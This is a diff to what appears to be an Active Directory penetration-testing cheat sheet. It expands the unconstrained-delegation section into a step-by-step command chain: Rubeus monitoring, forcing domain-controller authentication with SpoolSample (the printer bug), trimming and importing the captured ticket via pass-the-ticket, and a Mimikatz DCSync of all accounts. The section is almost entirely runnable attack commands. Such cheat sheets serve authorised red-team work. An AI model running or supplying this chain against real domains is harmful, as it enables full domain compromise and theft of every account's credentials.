@@ -373,9 +373,26 @@ spoolerscan.ps1
 ls \\<DC>\pipe\spoolss
 ```
 
-#### Attack
+#### Force authentication of the DC
+- Listen with Rubeus and force the DC to authenticate to the server
 ```
-.\MS-RPRN.exe \\<DC NAME> \\<TARGET SERVER WITH DELEGATION>
+.\rubeus.exe monitor /interval:5
+.\SpoolSample.exe \\<DC NAME> \\<TARGET SERVER WITH DELEGATION>
+```
+
+#### Copy, save and trim the ticket
+```
+cat dc_ticket.txt | tr -d "\n" | tr -d " "
+```
+
+#### Import the ticket
+```
+.\Rubeus.exe ptt /ticket:<TICKET>
+```
+
+#### Then DCSync
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
 ```
 
 ### Constrained Delegation
